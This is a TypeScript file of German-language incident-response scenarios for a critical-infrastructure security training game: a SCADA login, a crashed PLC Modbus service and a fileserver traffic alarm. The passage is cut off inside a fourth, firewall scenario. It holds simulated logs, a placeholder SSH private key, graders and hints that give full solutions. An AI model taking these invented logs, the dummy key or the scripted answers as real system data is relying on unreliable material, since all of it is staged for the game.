/**
 * KRITIS Infrastructure Scenarios
 * Advanced scenarios utilizing VFS templates and full shell engine
 */

import { Scenario } from '@kritis/shared';

// ============================================================================
// Schlüsselzugang in der Leittechnik
// ----------------------------------------------------------------------------
// Der Operator hat auf dem Leitstand ein Schlüsselpaar; die Feldgeräte
// vertrauen ihm für das Konto `operator`. Passwörter wären hier nicht nur
// unschön, sondern auch untippbar: Ein Level, dessen Hinweise ein Passwort
// nennen müssen, ist nicht mehr durch Abschreiben lösbar.
// ============================================================================

const LEITSTAND_PUBKEY =
  'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILeitstandOperator000000000000000000000 operator@scada-master';

const LEITSTAND_PRIVKEY =
  '-----BEGIN OPENSSH PRIVATE KEY-----\n' +
  'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt\n' +
  'ZWQyNTUxOQAAACALeitstandOperator00000000000000000000000000000000AA\n' +
  '-----END OPENSSH PRIVATE KEY-----\n';

/**
 * Das ~/.ssh eines Kontos auf der Ausgangsmaschine. Der private Schlüssel
 * MUSS 600 sein — sonst sortiert die Schlüsselprüfung ihn als ungeschützt aus
 * und der Anmeldeversuch landet beim Passwort, das es hier nicht gibt.
 */
const sshZugangVon = (user: string) => [
  { path: `/home/${user}/.ssh/id_ed25519`, content: LEITSTAND_PRIVKEY, mode: '600' },
  { path: `/home/${user}/.ssh/id_ed25519.pub`, content: LEITSTAND_PUBKEY + '\n' },
];

/** ~/.ssh des Operators auf dem Leitstand. */
const leitstandZugang = sshZugangVon('operator');

/** Die Zeile, die ein Feldgerät dem Leitstand vertrauen lässt. */
const vertrautDemLeitstand = {
  path: '/home/operator/.ssh/authorized_keys',
  content: LEITSTAND_PUBKEY + '\n',
};

export const kritisInfraScenarios: Scenario[] = [
  {
    id: 'KRITIS-SC-001',
    title: 'Unbekannter Zugriff auf das SCADA-System',
    category: 'security_incident',
    difficulty: 4,
    flavorText: `Das Monitoring schlägt Alarm: Ungewöhnliche Aktivität auf dem SCADA-Master (scada-master / 10.0.0.1).

Ein Operator behauptet "Ich war das nicht". Die HMI zeigt einen Login von IP 10.0.0.99 im OT-Netz - eine IP die dir nicht bekannt vorkommt.

Du bist auf dem SCADA-Master eingeloggt und sollst die Logs unter /opt/scada/logs analysieren.`,
    urgency: 'critical',
    choices: [
      {
        id: 'A',
        text: 'SCADA-System sofort vom Netz trennen',
        outcome: 'PARTIAL_SUCCESS',
        consequence: 'Das System ist offline, aber auch die Wasserversorgung für 50.000 Einwohner. Nach 2 Stunden Analyse: Es war ein Wartungszugang den der Hersteller "vergessen" hat zu dokumentieren.',
        scoreChange: 50,
        reputationChange: -10,
        lesson: 'Sofortige Isolierung ist bei echten Angriffen richtig, aber überstürzt ohne Analyse kann sie mehr Schaden anrichten.',
      },
      {
        id: 'B',
        text: 'Logs analysieren und Zugriff nachverfolgen (Terminal)',
        outcome: 'PERFECT',
        terminalCommand: true,
        consequence: 'Die Logs zeigen: Der Zugriff kam von 10.0.0.99 - einer IP die dem Wartungslaptop des Herstellers zugeordnet ist. Der Techniker war vor Ort für geplante Wartung, hatte aber vergessen sich anzumelden.',
        scoreChange: 200,
        reputationChange: 25,
        lesson: 'Forensische Analyse vor Panikreaktion. Aber: Undokumentierte Wartungszugänge sind ein Compliance-Problem!',
      },
      {
        id: 'C',
        text: 'Operator-Passwort zurücksetzen und abwarten',
        outcome: 'FAIL',
        consequence: 'Wenn es ein echter Angreifer wäre, hätte er jetzt 4 Stunden Zeit gehabt. War es nicht - aber deine Reaktion war unzureichend für einen KRITIS-Betreiber.',
        scoreChange: -150,
        reputationChange: -20,
        lesson: 'Bei OT-Security gilt: Assume Breach. Jeder Alarm muss analysiert werden.',
      },
    ],
    realWorldReference: 'Stuxnet wurde über einen Wartungslaptop eingeschleust. Wartungszugänge sind bevorzugte Angriffsvektoren.',
    bsiReference: 'BSI ICS-Security Kompendium: 3.4 Fernwartung',
    involvedNpcs: [],
    tags: ['scada', 'ot-security', 'security', 'incident-response'],
    terminalContext: {
      type: 'linux',
      hostname: 'scada-master',
      username: 'operator',
      currentPath: '/opt/scada/logs',
      templateIds: ['scada'],
      // Der Fall lebt vom ABGLEICH zweier Quellen: Das Betriebsprotokoll sagt
      // WER und WANN, die Freigabeliste sagt, WEM die Adresse gehört. Erst
      // beide zusammen beantworten die Frage, und genau deshalb verlangt die
      // Gewinnbedingung, dass beide gelesen wurden.
      taskText:
        'Zwei Quellen abgleichen: /opt/scada/logs/operations.log (wer hat sich wann angemeldet) und /opt/scada/config/access.log (wem gehört die Adresse laut Freigabeliste). Beide mit cat lesen, dann den Befund schreiben — der Editor fehlt, also mit echo "…" > datei und echo "…" >> datei anhängen.\n\nErgebnis nach /home/operator/befund.md, genau diese vier Zeilen:\nquelle: <IP>\nkonto: <Kontoname aus dem Protokoll>\nangriff: ja | nein | unklar\nfehlend: anmeldung | freigabe | keine\n\nZu „fehlend": Gefragt ist, was WIRKLICH fehlt — nicht, was fehlen könnte.',
      vfsOverlay: {
        directories: ['/opt/scada/logs', '/opt/scada/config', '/home/operator'],
        files: [
          {
            path: '/opt/scada/logs/operations.log',
            content:
              '2026-03-14 06:00:00 [INFO] System startup complete\n' +
              '2026-03-14 06:00:01 [INFO] Connected to PLC01 at 10.0.0.10\n' +
              '2026-03-14 08:00:00 [INFO] Operator login: technik01 from 10.0.0.100\n' +
              '2026-03-14 09:15:00 [WARN] Login attempt from 10.0.0.99 - User: maintenance\n' +
              '2026-03-14 09:15:01 [INFO] Session established for maintenance from 10.0.0.99\n' +
              '2026-03-14 09:30:00 [INFO] Setpoint change: Pump_01 speed 75% -> 80%\n' +
              '2026-03-14 09:45:00 [INFO] Session ended for maintenance\n',
          },
          {
            // Dieselbe Geschichte auch dort, wo die Vorlage ein Protokoll
            // anlegt — sonst findet ein neugieriger Spieler zwei Wahrheiten.
            path: '/var/log/scada/operations.log',
            content:
              '2026-03-14 09:15:00 [WARN] Login attempt from 10.0.0.99 - User: maintenance\n' +
              '2026-03-14 09:15:01 [INFO] Session established for maintenance from 10.0.0.99\n' +
              '2026-03-14 09:45:00 [INFO] Session ended for maintenance\n',
          },
          {
            path: '/opt/scada/config/access.log',
            content:
              '# Freigabeliste Fernzugriff — gepflegt von der Leittechnik\n' +
              '# adresse     kennung          inhaber                  freigegeben\n' +
              '10.0.0.100    hmi-station      Leitwarte, Platz 1       2021-02-01\n' +
              '10.0.0.99     siemens-wartung  Wartungslaptop Siemens   2024-06-15\n' +
              '10.0.0.98     reserve          (frei)                   -\n' +
              '\n' +
              '# Betriebsregel: Wartungszugriffe sind VORHER in der Leitwarte\n' +
              '# anzumelden (Telefon oder Ticket). Die Freigabe allein genügt nicht.\n',
          },
        ],
      },
      commandSkillGain: {
        cat: { linux: 1 },
        grep: { linux: 2, security: 1 },
        echo: { linux: 1 },
      },
      commands: [],
      solutions: [
        {
          commands: [],
          allRequired: false,
          stateGoals: [
            // Ohne beide Quellen ist der Befund geraten.
            { fileRead: '/opt/scada/logs/operations.log' },
            { fileRead: '/opt/scada/config/access.log' },
            {
              file: '/home/operator/befund.md',
              reportFields: [
                { key: 'quelle', matches: '^10\\.0\\.0\\.99$' },
                { key: 'konto', matches: '^maintenance$' },
                // Die Adresse steht seit 2024 in der Freigabeliste. „ja" wäre
                // eine Behauptung, „unklar" eine Ausrede — beides ist falsch,
                // weil der Beleg vorliegt.
                { key: 'angriff', matches: '^nein$' },
                // Und der eigentliche Befund: Nicht die Freigabe fehlt, die
                // gibt es. Die ANMELDUNG fehlt, die die Betriebsregel verlangt.
                { key: 'fehlend', matches: '^anmeldung$' },
              ],
            },
          ],
          resultText:
            'Sauber hergeleitet. Die Adresse 10.0.0.99 gehört zum Wartungslaptop des Herstellers und steht seit Juni 2024 in der Freigabeliste — das war kein Angriff, und du kannst es belegen statt es zu hoffen.\n\nWas trotzdem fehlt, ist die Anmeldung. Die Betriebsregel verlangt sie vorher, per Telefon oder Ticket; passiert ist es nicht. Der Unterschied ist wichtig genug für den Bericht: Eine fehlende Freigabe wäre ein Zugangsproblem, eine fehlende Anmeldung ist ein Prozessproblem. Wer beides gleich benennt, bekommt beim nächsten Mal die falsche Maßnahme.\n\nUnd der Preis der Alternative steht daneben: Hätte man das SCADA-System bei diesem Alarm sofort vom Netz genommen, wären 50.000 Einwohner ohne Wasser gewesen — wegen eines Technikers, der vergessen hat anzurufen.',
          skillGain: { security: 5, troubleshooting: 4, linux: 2 },
          effects: { stress: -1 },
        },
      ],
      hints: [
        '🤖 Jens: Die Frage ist nicht „war da jemand", sondern „wem gehört die Adresse". Das Betriebsprotokoll beantwortet die erste Hälfte, die Freigabeliste der Leittechnik die zweite. Beide liegen unter /opt/scada.',
        '🤖 Jens: Lies die Freigabeliste bis zum Ende. Unter der Tabelle steht die Betriebsregel — und die entscheidet darüber, ob hier wirklich alles in Ordnung war.',
        '🤖 Jens: Für den Befund gibt es keinen Editor. Die erste Zeile mit einer einfachen Umlenkung schreiben, jede weitere anhängen — sonst überschreibst du dir die vorige.',
        '🤖 Jens: `cat /opt/scada/logs/operations.log` → `cat /opt/scada/config/access.log` → `echo "quelle: 10.0.0.99" > /home/operator/befund.md` → `echo "konto: maintenance" >> /home/operator/befund.md` → `echo "angriff: nein" >> /home/operator/befund.md` → `echo "fehlend: anmeldung" >> /home/operator/befund.md`.',
      ],
    },
  },

  {
    id: 'KRITIS-SC-002',
    title: 'PLC03 antwortet nicht mehr',
    category: 'troubleshooting',
    difficulty: 3,
    flavorText: `Das SCADA-Dashboard zeigt: PLC03 (Sensorik) - Verbindung unterbrochen!

Netzwerk-Übersicht:
- Du bist auf: scada-master (10.0.0.1)
- PLC01 Pumpensteuerung: 10.0.0.10 (online)
- PLC02 Ventilsteuerung: 10.0.0.11 (online)
- PLC03 Sensorik: 10.0.0.12 (OFFLINE) ← Problem!

Ohne Sensorik fliegt die Anlage "blind". Die letzten Messwerte von PLC03 sind 5 Minuten alt. Prüfe die Verbindung zu 10.0.0.12.`,
    urgency: 'critical',
    choices: [
      {
        id: 'A',
        text: 'Anlage in den manuellen Modus schalten',
        outcome: 'SUCCESS',
        consequence: 'Richtige Erstreaktion! Die Anlage läuft weiter unter manueller Kontrolle während du das Problem analysierst.',
        scoreChange: 100,
        reputationChange: 10,
        lesson: 'Bei OT-Systemen: Erst sicheren Zustand herstellen, dann debuggen.',
      },
      {
        id: 'B',
        text: 'Netzwerkverbindung zum PLC prüfen (Terminal)',
        outcome: 'PERFECT',
        terminalCommand: true,
        consequence: 'Ping zeigt: PLC erreichbar. Modbus-Port 502 geschlossen. Der PLC braucht einen Neustart - Firmware-Bug bei hoher Last. Problem dokumentiert und an Siemens gemeldet.',
        scoreChange: 200,
        reputationChange: 20,
        lesson: 'Systematische Diagnose: Erst Layer 3 (Ping), dann Layer 4 (Port), dann Applikation.',
      },
      {
        id: 'C',
        text: 'Warten ob sich das Problem von selbst löst',
        outcome: 'CRITICAL_FAIL',
        consequence: '15 Minuten später: Drucksensor meldet nicht, Pumpe läuft auf Maximum, Rohrbruch. 200.000 Euro Schaden.',
        scoreChange: -400,
        reputationChange: -30,
        lesson: 'In OT-Systemen ist "Abwarten" keine Option. Sensoren sind keine optionalen Features.',
      },
    ],
    realWorldReference: 'Industrie-PLCs haben oft Stabilitätsprobleme unter Last. Watchdogs und Redundanz sind essentiell.',
    bsiReference: 'BSI ICS-Security Kompendium: 4.2 Verfügbarkeit',
    involvedNpcs: [],
    tags: ['scada', 'plc', 'troubleshooting', 'modbus'],
    terminalContext: {
      type: 'linux',
      hostname: 'scada-master',
      username: 'operator',
      currentPath: '/opt/scada',
      templateIds: ['scada'],
      // Der Fall ist eine Schichtenfrage: Das Dashboard sagt „Verbindung
      // unterbrochen" und meint damit drei mögliche Dinge auf einmal —
      // Leitung, Gerät, Dienst. Erst die Messung trennt sie. Deshalb ist PLC03
      // eine echte Maschine mit echtem Regelwerk und echten Diensten: Wer
      // pingt, pingt wirklich, und wer den Port klopft, klopft an den Dienst,
      // der dort läuft oder eben nicht.
      taskText:
        'PLC03 (10.0.0.12) ist laut Dashboard weg. Finde heraus, auf welcher Ebene — und bring die Sensorik zurück, ohne die Anlage anzuhalten.\n\nDie Modbus-Schnittstelle liegt auf Port 502. Der Leitstand kommt per ssh auf die Feldgeräte (Konto operator, Schlüssel liegt). Was auf PLC03 sonst noch läuft, muss weiterlaufen.',
      net: {
        // Ein OT-Netz ist kein Internet: Was hier nicht steht, ist nicht da.
        targets: [
          { host: '10.0.0.10', openPorts: [502], dienste: { 502: 'mbap' } },
          { host: '10.0.0.11', openPorts: [502], dienste: { 502: 'mbap' } },
        ],
      },
      vfsOverlay: {
        directories: ['/opt/scada/config', '/home/operator/.ssh'],
        files: [
          ...leitstandZugang,
          {
            path: '/opt/scada/config/plc_config.json',
            content:
              '{\n' +
              '  "plc_devices": [\n' +
              '    {"id": "PLC01", "ip": "10.0.0.10", "type": "S7-1200", "function": "Pumpensteuerung"},\n' +
              '    {"id": "PLC02", "ip": "10.0.0.11", "type": "S7-1200", "function": "Ventilsteuerung"},\n' +
              '    {"id": "PLC03", "ip": "10.0.0.12", "type": "S7-300",  "function": "Sensorik"}\n' +
              '  ],\n' +
              '  "protocol": "modbus-tcp",\n' +
              '  "port": 502\n' +
              '}\n',
          },
        ],
      },
      // Der Leitstand hat SELBST einen modbus-Dienst — den Client, der die
      // Feldgeräte abfragt. Wer den neu startet, hat etwas neu gestartet und
      // nichts repariert. Das ist kein Gemeinheit, sondern der Alltag: Der
      // Dienst heißt auf beiden Kisten gleich.
      services: [
        { unit: 'modbus.service', active: 'active', desc: 'Modbus TCP Client (Leitsystem)', exec: '/usr/bin/modbus-poll' },
      ],
      journal: [
        { ts: '2026-03-14 09:55:00', unit: 'modbus', priority: 'warning', message: 'PLC03 (10.0.0.12): response timeout (attempt 1/3)' },
        { ts: '2026-03-14 09:55:05', unit: 'modbus', priority: 'warning', message: 'PLC03 (10.0.0.12): response timeout (attempt 2/3)' },
        { ts: '2026-03-14 09:55:10', unit: 'modbus', priority: 'err', message: 'PLC03 (10.0.0.12): connection lost after 3 attempts' },
        { ts: '2026-03-14 09:55:10', unit: 'modbus', priority: 'err', message: 'PLC03: sensor data stale — last update 09:50:12' },
        { ts: '2026-03-14 09:55:11', unit: 'modbus', priority: 'info', message: 'PLC01, PLC02: polling normal' },
      ],
      hosts: [
        {
          id: 'plc03',
          hostname: 'plc03',
          ip: '10.0.0.12',
          accounts: [{ name: 'operator' }, { name: 'root' }],
          vfsOverlay: {
            directories: ['/run/modbus'],
            files: [
              vertrautDemLeitstand,
              // Die Spur des Absturzes: eine Sperrdatei, die niemand aufgeräumt
              // hat. Genau daran scheitert jeder Startversuch — und genau das
              // erzählt der Dienst auch, wenn man ihn fragt.
              { path: '/run/modbus/modbus.lock', content: 'pid=4412 since=2026-03-14T09:54:58\n' },
            ],
          },
          services: [
            {
              unit: 'modbus.service',
              active: 'failed',
              desc: 'Modbus TCP Server (S7-300 Sensorik)',
              exec: '/usr/sbin/modbusd --port 502',
              listens: [{ proto: 'tcp', port: 502 }],
              startRequires: [{
                file: '/run/modbus/modbus.lock',
                absent: true,
                failMessage: 'Stale lock file /run/modbus/modbus.lock (pid 4412) — refusing to start',
              }],
            },
            // Die Datenerfassung läuft weiter und sammelt in den Ringpuffer.
            // Wer sie abschaltet, verliert die Messwerte der Ausfallzeit —
            // die, die der Betrieb hinterher lesen will.
            { unit: 'sensor-hub.service', active: 'active', desc: 'Sensor Hub Datenerfassung (Ringpuffer)', exec: '/usr/sbin/sensor-hub' },
          ],
          listeners: [{ proto: 'tcp', port: 22, pid: 456, program: 'sshd' }],
          journal: [
            { ts: '2026-03-14 09:54:58', unit: 'modbus', priority: 'err', message: 'modbusd[4412]: segmentation fault in frame decoder (input register 40012)' },
            { ts: '2026-03-14 09:54:58', unit: 'modbus', priority: 'err', message: 'modbus.service: Main process exited, code=dumped, status=11/SEGV' },
            { ts: '2026-03-14 09:54:59', unit: 'modbus', priority: 'err', message: 'modbus.service: Failed with result core-dump.' },
            { ts: '2026-03-14 09:55:30', unit: 'modbus', priority: 'err', message: 'Stale lock file /run/modbus/modbus.lock (pid 4412) — refusing to start' },
            { ts: '2026-03-14 09:56:00', unit: 'sensor-hub', priority: 'info', message: 'Ringpuffer aktiv, 1200 Messwerte gepuffert (kein Abnehmer)' },
          ],
        },
      ],
      commandSkillGain: {
        ping: { netzwerk: 2 },
        nc: { netzwerk: 3, troubleshooting: 2 },
        ssh: { linux: 2 },
        systemctl: { linux: 2, troubleshooting: 2 },
        journalctl: { linux: 2, troubleshooting: 2 },
      },
      commands: [],
      solutions: [
        {
          commands: [],
          allRequired: false,
          stateGoals: [
            // Die Aufgabe: der Modbus-Server auf DEM Gerät läuft wieder.
            { host: 'plc03', service: 'modbus.service', serviceState: 'active' },
            // Und die bewahrende Bedingung: Die Datenerfassung hat das
            // überlebt. Ohne sie wäre „alles neu starten" eine Lösung.
            { host: 'plc03', service: 'sensor-hub.service', serviceState: 'active' },
          ],
          resultText:
            'Sauber getrennt. Der Ping ging durch — also lebte das Gerät und die Leitung stand; zu war nur Port 502, also der Dienst. Genau diese zwei Messungen unterscheiden „Netzwerkproblem" von „Anwendungsproblem", und sie kosten zusammen zwanzig Sekunden.\n\nAuf PLC03 lag der eigentliche Grund: Der Modbus-Server war um 09:54:58 abgestürzt und hat eine Sperrdatei hinterlassen. Solange die dalag, verweigerte jeder Startversuch den Dienst — mit genau dieser Begründung im Protokoll. Ein „Neustart des PLC", den der Hersteller empfiehlt, hätte dasselbe erreicht und nebenbei die Anlage angehalten.\n\nWas du nicht angefasst hast, zählt mit: Die Datenerfassung lief weiter und hat die 1200 Messwerte der Ausfallzeit im Ringpuffer. Wer in so einer Lage „einmal alles durchstarten" sagt, wirft genau die Daten weg, mit denen man hinterher erklärt, was passiert ist.\n\nDer Vollständigkeit halber: Vom Leitstand aus klopft `nc -zv 10.0.0.12 502` jetzt an einen offenen Port. Das Dashboard merkt es beim nächsten Abfragezyklus von selbst.',
          skillGain: { netzwerk: 4, troubleshooting: 5, linux: 3 },
          effects: { stress: -1 },
        },
      ],
      hints: [
        '🤖 Jens: „Verbindung unterbrochen" ist keine Diagnose, das ist ein Symptom. Es kann die Leitung sein, das Gerät oder der Dienst darauf — und du kannst die drei einzeln messen, von unten nach oben.',
        '🤖 Jens: Erst die Kiste, dann der Port. Wenn die Kiste antwortet und der Port trotzdem zu ist, liegt es nicht am Netz. Modbus hört auf 502.',
        '🤖 Jens: Dann gehörst du auf das Gerät. Der Leitstand kommt per ssh drauf, Konto operator. Frag dort den Dienst, was ihm fehlt — und lies die Begründung, statt sie zu überlesen.',
        '🤖 Jens: Konkret: `ping -c 3 10.0.0.12` → `nc -zv 10.0.0.12 502` → `ssh plc03` → `systemctl status modbus` → `sudo rm /run/modbus/modbus.lock` → `sudo systemctl start modbus`.',
      ],
    },
  },
  {
    id: 'KRITIS-SC-003',
    title: 'Monitoring zeigt verdächtige Netzwerk-Aktivität',
    category: 'security_incident',
    difficulty: 4,
    flavorText: `Das Netzwerk-Monitoring schlägt an: Ungewöhnlich hoher Traffic vom Fileserver Richtung Internet!

Alert-Details:
- Quelle: FS01 (Fileserver) - 192.168.10.2
- Traffic: 523 MB/h (Baseline: 50 MB/h) - 10x normal!
- Richtung: Ausgehend ins Internet

Du bist auf dem Monitoring-Server (monitoring-srv) eingeloggt. Die Logs liegen unter /var/log/monitoring/.

Finde heraus: Wer verursacht den Traffic und wohin geht er?`,
    urgency: 'high',
    choices: [
      {
        id: 'A',
        text: 'Fileserver sofort vom Internet trennen',
        outcome: 'PARTIAL_SUCCESS',
        consequence: 'Der Server ist offline. Analyse zeigt: Ein Mitarbeiter hat einen großen Datensatz für ein legitimes Projekt hochgeladen. Aber: Warum wusste niemand davon?',
        scoreChange: 75,
        reputationChange: 5,
        lesson: 'Quarantäne ist richtig bei Verdacht, aber schnelle Analyse hätte gezeigt dass es legitim war.',
      },
      {
        id: 'B',
        text: 'Traffic-Analyse durchführen (Terminal)',
        outcome: 'PERFECT',
        terminalCommand: true,
        consequence: 'Die Analyse zeigt: Traffic geht zu einer Cloud-Storage-IP. Verursacher ist user.schmidt der ein 500 MB Video für Marketing hochlädt. Legitim - aber nicht über unsere Upload-Policy informiert!',
        scoreChange: 200,
        reputationChange: 20,
        lesson: 'Baseline-Monitoring ist essenziell. Abweichungen analysieren, nicht blind reagieren.',
      },
      {
        id: 'C',
        text: 'Alarm ignorieren - ist wahrscheinlich ein Backup',
        outcome: 'FAIL',
        consequence: 'War dieses Mal legitim. Aber was, wenn es nächstes Mal Datenexfiltration ist? Du hast dein Monitoring-System gerade als "ignorierbar" etabliert.',
        scoreChange: -100,
        reputationChange: -15,
        lesson: 'Jeden Alarm zu ignorieren trainiert Nachlässigkeit. Analyze or escalate.',
      },
    ],
    realWorldReference: 'Datenexfiltration wird oft durch ungewöhnliche Datenmengen entdeckt. Aber: False Positives sind häufig.',
    bsiReference: 'BSI IT-Grundschutz: DER.1 Detektion von sicherheitsrelevanten Ereignissen',
    involvedNpcs: [],
    tags: ['monitoring', 'traffic-analysis', 'exfiltration', 'baseline'],
    terminalContext: {
      type: 'linux',
      hostname: 'monitoring-srv',
      username: 'secops',
      currentPath: '/var/log/monitoring',
      templateIds: ['monitoring'],
      // Der Fall lebt von einem Missverständnis, das der Alarm selbst
      // produziert: Er nennt den Fileserver als „Quelle", weil der Verkehr
      // dort durchläuft. Der Verursacher ist ein anderer. Wer den Alarm
      // abschreibt statt ihn zu prüfen, sperrt die falsche Maschine.
      taskText:
        'Drei Quellen zusammenlegen: /var/log/monitoring/alerts.log (was ist aufgefallen), /var/log/monitoring/fs01-zugriffe.log (wer hat was geholt) und /etc/monitoring/adressbereiche.txt (wem gehört das Ziel). Alle drei mit cat lesen.\n\nBefund nach /home/secops/befund.md schreiben — es gibt keinen Editor, also echo "…" > datei für die erste Zeile und echo "…" >> datei für jede weitere. Genau diese fünf Zeilen:\nverursacher: <Kontoname>\nquelle: <IP des Verursachers>\nziel: <Firma laut Adressbereichsliste, ein Wort>\nangriff: ja | nein | unklar\nfehlend: richtlinie | freigabe | firewallregel | keine\n\nZu „fehlend": Gefragt ist, was hier WIRKLICH gefehlt hat — nicht, was man zusätzlich bauen könnte.',
      vfsOverlay: {
        directories: ['/var/log/monitoring', '/etc/monitoring', '/home/secops'],
        files: [
          {
            path: '/var/log/monitoring/alerts.log',
            content:
              '=== Netzwerk-Alarme (Schwellwert: 3x Baseline) ===\n' +
              '2026-03-14 09:00:00 [WARN]  FS01 (192.168.10.2): ausgehend 523 MB/h (Baseline 50 MB/h)\n' +
              '2026-03-14 09:00:00 [INFO]  Ziel: 142.250.185.78:443\n' +
              '2026-03-14 09:00:00 [INFO]  Top-Talker im Segment: 192.168.20.45\n' +
              '2026-03-14 09:00:01 [INFO]  Korrelation: eine einzige Sitzung, kein Fanout\n' +
              '\n' +
              '# Hinweis der Monitoring-Doku: Als QUELLE meldet die Sonde den Host,\n' +
              '# über dessen Schnittstelle der Verkehr läuft — nicht den, der ihn\n' +
              '# ausgelöst hat. Wer den Verursacher sucht, nimmt den Top-Talker.\n',
          },
          {
            path: '/var/log/monitoring/fs01-zugriffe.log',
            content:
              '# Dateizugriffe FS01 — 14.03.2026\n' +
              '08:45:12 192.168.20.45 user.schmidt  READ  /Marketing/Kampagne2026/Video_final.mp4  523456789\n' +
              '08:52:03 192.168.20.12 user.weber    READ  /Buchhaltung/Umsatz_Q1.xlsx  184320\n' +
              '09:00:01 192.168.20.45 user.schmidt  READ  /Marketing/Kampagne2026/Video_final.mp4  523456789\n' +
              '09:31:44 192.168.20.31 user.klein    WRITE /Technik/Abnahmebericht.docx  95232\n',
          },
          {
            path: '/etc/monitoring/adressbereiche.txt',
            content:
              '# Bekannte Adressbereiche — gepflegt vom Netzbetrieb\n' +
              '# bereich                 inhaber              einstufung\n' +
              '142.250.0.0/15            Google               Cloud-Dienst, vertraglich zugelassen\n' +
              '52.96.0.0/12              Microsoft            Cloud-Dienst, vertraglich zugelassen\n' +
              '45.83.220.0/24            (unbekannt)          im Vorjahr als Scan-Quelle aufgefallen\n' +
              '192.168.10.0/24           Serversegment        intern\n' +
              '192.168.20.0/24           Arbeitsplätze       intern\n' +
              '\n' +
              '# Betriebsregel Cloud-Nutzung: Uploads über 100 MB an externe\n' +
              '# Dienste sind vorher beim Informationssicherheitsbeauftragten\n' +
              '# anzumelden. Eine solche Richtlinie GIBT es nicht — sie steht\n' +
              '# seit 2024 als offener Punkt im Massnahmenplan.\n',
          },
        ],
      },
      commandSkillGain: {
        cat: { linux: 1 },
        grep: { linux: 2, security: 1 },
        echo: { linux: 1 },
      },
      commands: [],
      solutions: [
        {
          commands: [],
          allRequired: false,
          stateGoals: [
            { fileRead: '/var/log/monitoring/alerts.log' },
            { fileRead: '/var/log/monitoring/fs01-zugriffe.log' },
            { fileRead: '/etc/monitoring/adressbereiche.txt' },
            {
              file: '/home/secops/befund.md',
              reportFields: [
                { key: 'verursacher', matches: '^user\\.schmidt$' },
                // Der Alarm nennt 192.168.10.2. Das ist der Weg, nicht die
                // Ursache — genau hier trennt sich Lesen von Abschreiben.
                { key: 'quelle', matches: '^192\\.168\\.20\\.45$' },
                { key: 'ziel', matches: '^google$' },
                { key: 'angriff', matches: '^nein$' },
                // Nicht die Firewallregel fehlt — der Verkehr war erlaubt und
                // sollte es bleiben. Gefehlt hat die Richtlinie, die sagt, ab
                // wann so ein Upload anzumelden ist.
                { key: 'fehlend', matches: '^richtlinie$' },
              ],
            },
          ],
          resultText:
            'Richtig zerlegt. Der Alarm nannte den Fileserver, weil der Verkehr über dessen Schnittstelle lief — verursacht hat ihn die Arbeitsstation 192.168.20.45. Wer die Meldung abschreibt, nimmt FS01 vom Netz und legt damit die halbe Verwaltung lahm, während der eigentliche Rechner weiterlädt.\n\nDas Ziel gehört Google und steht als vertraglich zugelassener Cloud-Dienst in der Adressbereichsliste. Ein 500-MB-Video an einen zugelassenen Dienst ist kein Angriff, und es als einen zu melden, kostet dich beim nächsten echten Alarm die Aufmerksamkeit.\n\nGefehlt hat trotzdem etwas — nur nichts Technisches. Niemand wusste von dem Upload, weil es keine Regel gibt, ab wann man so etwas ankündigt. Der Punkt steht seit 2024 im Maßnahmenplan. Eine Firewallregel hätte hier nur einen erlaubten Vorgang kaputtgemacht und die Lücke gelassen, wo sie ist.',
          skillGain: { security: 5, netzwerk: 4, troubleshooting: 3 },
          effects: { stress: -1 },
        },
      ],
      hints: [
        '🤖 Jens: Lies den Alarm zuerst ganz — bis unter die Zahlen. Da steht, was die Sonde mit „Quelle" eigentlich meint, und das ist nicht, was du denkst.',
        '🤖 Jens: Der Top-Talker ist eine Adresse, kein Mensch. Auf dem Fileserver liegt das Protokoll, das aus der Adresse einen Namen und eine Datei macht.',
        '🤖 Jens: Und bevor du „verdächtiges Ziel" schreibst: Der Netzbetrieb führt eine Liste, wem welche Bereiche gehören. Am Ende der Liste steht außerdem, welche Betriebsregel es dazu gibt — und welche nicht.',
        '🤖 Jens: Konkret: `cat /var/log/monitoring/alerts.log` → `cat /var/log/monitoring/fs01-zugriffe.log` → `cat /etc/monitoring/adressbereiche.txt` → `echo "verursacher: user.schmidt" > /home/secops/befund.md` → `echo "quelle: 192.168.20.45" >> /home/secops/befund.md` → `echo "ziel: google" >> /home/secops/befund.md` → `echo "angriff: nein" >> /home/secops/befund.md` → `echo "fehlend: richtlinie" >> /home/secops/befund.md`.',
      ],
    },
  },
  {
    id: 'KRITIS-SC-004',
    title: 'Firewall blockiert plötzlich legitimen Traffic',
    category: 'troubleshooting',
    difficulty: 3,
    flavorText: `Mehrere Außenstellen melden: "VPN geht nicht mehr"!

Betroffene VPN-Verbindungen:
- Außenstelle-Nord (87.123.45.67) → Leitstelle: KEINE VERBINDUNG
- Außenstelle-Süd (91.234.56.78) → Leitstelle: OK

Du bist auf dem Firewall-Management-Server (fw-mgmt) eingeloggt.
Konfig-Verzeichnis: /etc/firewall/

Letzte Änderung an der Firewall laut Change-Log: Gestern Abend 23:00 Uhr.
Finde heraus was geändert wurde und warum nur manche Außenstellen betroffen sind.`,
    urgency: 'critical',
    choices: [
      {
        id: 'A',
        text: 'Letzte Änderung sofort zurückrollen',
        outcome: 'SUCCESS',
        consequence: 'Rollback erfolgreich. VPN funktioniert wieder. Analyse zeigt: Eine neue Geo-Blocking-Regel hat auch deutsche IPs erwischt die "verdächtig" aussahen.',
        scoreChange: 100,
        reputationChange: 10,
        lesson: 'Rollback-Fähigkeit ist Gold wert. Change-Dokumentation ermöglicht schnelle Problemlösung.',
      },
      {
        id: 'B',
        text: 'Änderung analysieren und gezielt fixen (Terminal)',
        outcome: 'PERFECT',
        terminalCommand: true,
        consequence: 'Du findest die fehlerhafte Regel: Geo-Blocking für "non-EU" blockiert auch dynamische IP-Ranges deutscher Provider. Du fixst die Regel ohne kompletten Rollback.',
        scoreChange: 200,
        reputationChange: 20,
        lesson: 'Gezielter Fix ist besser als Rollback, wenn man das Problem versteht. Dokumentiere alles!',
      },
      {
        id: 'C',
        text: 'ISP anrufen - vielleicht ist es deren Problem',
        outcome: 'FAIL',
        consequence: '2 Stunden in der Warteschleife. ISP: "Bei uns ist alles ok." Währenddessen: Außenstellen arbeiten blind, Leitstelle nicht erreichbar.',
        scoreChange: -150,
        reputationChange: -15,
        lesson: 'Erst interne Änderungen prüfen bevor man extern eskaliert. "Wir haben gestern was geändert" sollte der erste Gedanke sein.',
      },
    ],
